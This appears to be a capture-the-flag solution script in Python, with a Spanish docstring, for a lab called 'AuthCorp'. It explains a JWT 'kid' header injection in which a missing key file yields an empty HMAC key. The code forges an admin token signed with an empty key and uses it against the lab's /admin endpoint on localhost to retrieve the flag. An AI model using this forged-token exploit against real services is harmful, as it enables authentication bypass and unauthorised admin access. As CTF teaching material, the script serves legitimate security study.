"""
Solución: JWT kid Injection — AuthCorp
=======================================

El servidor carga el archivo de clave HMAC desde /keys/{kid}.key
donde kid proviene del header JWT sin sanitización.

Si el archivo no existe → key = '' (cadena vacía).

Exploit:
  1. Forjar un JWT con header kid='nonexistent' (o cualquier nombre inexistente)
  2. Firmarlo con clave vacía ''
  3. El servidor intentará abrir /keys/nonexistent.key → FileNotFoundError → key=''
  4. jwt.decode() verifica la firma con '' → coincide → acceso concedido

Herramientas: PyJWT
"""
import jwt, requests, re

BASE = 'http://localhost:8080'

# Paso 1: Forjar JWT con kid inválido y clave vacía
payload = {'username': 'admin', 'role': 'admin'}
forged_token = jwt.encode(
    payload,
    '',                          # clave vacía
    algorithm='HS256',
    headers={'kid': 'nonexistent'}  # archivo que no existe
)
print(f"[*] Token forjado: {forged_token[:60]}...")

# Paso 2: Verificar con /profile
headers = {'Authorization': f'Bearer {forged_token}'}
r = requests.get(f'{BASE}/profile', headers=headers)
print(f"[*] /profile: {r.json()}")

# Paso 3: Obtener flag desde /admin
r = requests.get(f'{BASE}/admin', headers=headers)
resp = r.json()
print(f"[+] /admin: {resp}")

if 'flag' in resp:
    print(f"[+] Flag: {resp['flag']}")
elif 'CTF{' in str(resp):
    match = re.search(r'CTF\{[^}]+\}', str(resp))
    if match:
        print(f"[+] Flag: {match.group(0)}")
